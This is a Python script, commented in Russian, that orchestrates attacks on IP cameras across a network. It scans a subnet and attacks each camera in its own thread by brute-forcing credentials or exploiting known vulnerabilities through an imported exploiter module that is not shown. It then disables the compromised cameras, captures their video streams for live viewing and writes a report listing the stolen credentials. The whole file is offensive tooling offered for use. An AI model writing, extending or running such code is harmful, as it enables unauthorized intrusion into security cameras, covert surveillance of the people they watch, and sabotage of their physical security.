from main_controller import CameraNetworkScanner
from camera_exploiter import CameraExploiter
import threading
import time
import json
import cv2

class CameraAttackOrchestrator:
    def __init__(self):
        self.scanner = CameraNetworkScanner()
        self.exploiters = []
        self.captured_streams = []
        
    def full_network_attack(self, network_range='192.168.1.0/24'):
        """Полная атака на все камеры в сети"""
        print("Starting comprehensive camera network attack...")
        
        # Сканирование сети
        self.scanner.scan_network(network_range)
        
        print(f"Found {len(self.scanner.cameras_found)} potential cameras")
        
        # Атака каждой найденной камеры
        threads = []
        for camera in self.scanner.cameras_found:
            thread = threading.Thread(target=self.attack_single_camera, args=(camera,))
            threads.append(thread)
            thread.start()
            time.sleep(0.1)  # Чтобы не перегружать сеть
        
        for thread in threads:
            thread.join()
        
        self.generate_report()
    
    def attack_single_camera(self, camera_info):
        """Атака отдельной камеры"""
        print(f"Attacking camera: {camera_info['ip']}")
        
        exploiter = CameraExploiter(camera_info)
        self.exploiters.append(exploiter)
        
        # Попытка аутентификации
        if exploiter.brute_force_credentials() or exploiter.exploit_known_vulnerabilities():
            print(f"Successfully compromised: {camera_info['ip']}")
            
            # Отключение камеры
            if exploiter.disable_camera():
                print(f"Camera disabled: {camera_info['ip']}")
            
            # Захват потока
            stream = exploiter.capture_stream()
            if stream:
                self.captured_streams.append({
                    'camera': camera_info,
                    'stream': stream
                })
                print(f"Stream captured from: {camera_info['ip']}")
        else:
            print(f"Failed to compromise: {camera_info['ip']}")
    
    def generate_report(self):
        """Генерация отчета о атаке"""
        report = {
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'cameras_found': len(self.scanner.cameras_found),
            'cameras_compromised': len([e for e in self.exploiters if e.authenticated]),
            'details': []
        }
        
        for exploiter in self.exploiters:
            camera_data = {
                'ip': exploiter.camera['ip'],
                'manufacturer': exploiter.camera.get('manufacturer', 'Unknown'),
                'compromised': exploiter.authenticated,
                'credentials': {
                    'username': exploiter.camera.get('username', 'Unknown'),
                    'password': exploiter.camera.get('password', 'Unknown')
                } if exploiter.authenticated else None
            }
            report['details'].append(camera_data)
        
        # Сохранение отчета
        with open('camera_attack_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"Attack report saved: camera_attack_report.json")
        print(f"Summary: {report['cameras_compromised']}/{report['cameras_found']} cameras compromised")
    
    def real_time_monitoring(self):
        """Режим реального времени для просмотра потоков"""
        if not self.captured_streams:
            print("No streams captured")
            return
        
        print(f"Displaying {len(self.captured_streams)} captured streams")
        
        while True:
            for i, stream_data in enumerate(self.captured_streams):
                camera = stream_data['camera']
                stream = stream_data['stream']
                
                ret, frame = stream.read()
                if ret:
                    cv2.imshow(f"Camera {camera['ip']}", frame)
            
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        
        for stream_data in self.captured_streams:
            stream_data['stream'].release()
        cv2.destroyAllWindows()

def main():
    attacker = CameraAttackOrchestrator()
    
    print("Camera Network Attack System")
    print("1. Full Network Attack")
    print("2. Custom IP Range Attack")
    print("3. Single Camera Attack")
    
    choice = input("Select option (1-3): ")
    
    if choice == "1":
        attacker.full_network_attack()
    elif choice == "2":
        ip_range = input("Enter IP range (e.g., 192.168.1.0/24): ")
        attacker.full_network_attack(ip_range)
    elif choice == "3":
        ip = input("Enter camera IP: ")
        port = input("Enter port (default 80): ") or "80"
        camera_info = {'ip': ip, 'port': port, 'protocol': 'http', 'url': f'http://{ip}:{port}'}
        attacker.attack_single_camera(camera_info)
    else:
        attacker.full_network_attack()
    
    # Предложение просмотреть потоки
    if attacker.captured_streams:
        view = input("View captured streams? (y/n): ")
        if view.lower() == 'y':
            attacker.real_time_monitoring()

if __name__ == "__main__":
    main()
